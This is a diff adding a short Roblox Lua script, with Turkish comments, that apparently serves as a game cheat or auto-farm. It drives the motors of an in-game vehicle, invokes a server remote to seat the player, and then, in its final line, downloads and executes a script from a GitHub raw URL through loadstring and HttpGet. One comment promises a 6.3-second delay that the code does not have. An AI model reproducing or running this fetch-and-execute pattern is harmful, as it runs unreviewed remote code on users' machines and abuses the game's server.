@@ -1,0 +1,27 @@
+local equipment = workspace.Equipment.JDS790
+local motors = {
+    equipment.Components.Powertrain.R1Motor,
+    equipment.Components.Powertrain.R0Motor,
+    equipment.Components.Powertrain.L0Motor,
+    equipment.Components.Powertrain.L1Motor
+}
+
+-- İlk remote çalıştırılacak
+game:GetService("RunService").Heartbeat:Connect(function()
+    for _, motor in ipairs(motors) do
+        motor.AngularVelocity = -25
+    end
+end)
+
+-- 6.3 saniye sonra ikinci remote çalışacak
+wait(1)
+
+local args = {
+    [1] = workspace:WaitForChild("Equipment"):WaitForChild("JDS790"),
+    [2] = workspace:WaitForChild("Equipment"):WaitForChild("JDS790"):WaitForChild("Chassis"):WaitForChild("Seats"):WaitForChild("DriveSeat")
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("_REMOTE_STORAGE"):WaitForChild("FNCEnterEquipment"):InvokeServer(unpack(args))
+
+-- 6.3 saniye sonrası, URL'den script yükleniyor
+loadstring(game:HttpGet("https://github.com/messiyimben/leomessi/raw/refs/heads/main/YEPYENIFARM"))()
